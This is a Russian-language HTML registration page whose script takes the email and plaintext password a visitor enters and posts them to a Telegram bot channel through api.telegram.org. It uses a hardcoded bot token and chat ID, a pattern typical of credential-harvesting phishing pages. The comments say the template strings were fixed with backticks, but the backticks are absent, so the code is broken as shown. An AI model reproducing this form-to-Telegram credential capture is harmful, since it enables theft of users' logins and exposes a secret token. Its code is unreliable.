<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
        body { font-family: Arial, sans-serif; }
        form { max-width: 300px; margin: auto; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { padding: 10px; width: 100%; }
    </style>
</head>
<body>

<h2>Регистрация</h2>
<form id="registrationForm">
    <input type="email" id="email" placeholder="Введите ваш email" required>
    <input type="password" id="password" placeholder="Введите пароль" required>
    <button type="submit">Зарегистрироваться</button>
</form>

<script>

document.getElementById('registrationForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Исправлено: используем обратные кавычки для шаблонной строки
    const message = Новая регистрация:\nEmail: ${email}\nПароль: ${password};

    // Замените <Ваш_Токен> и <ID_Канала> на ваши данные
    const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g'; // Уберите угловые скобки
    const chatId = '-1002372284940'; // Убедитесь, что это правильный ID канала
    // Исправлено: используем обратные кавычки для шаблонной строки
    const url = https://api.telegram.org/bot${token}/sendMessage; // Добавьте URL для API

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Регистрация успешна!');
        } else {
            alert('Ошибка при отправке данных.');
        }
    })
    .catch(error => {
        console.error('Ошибка:', error);
        alert('Ошибка при отправке данных.');
    });
});

</script>

</body>
</html>
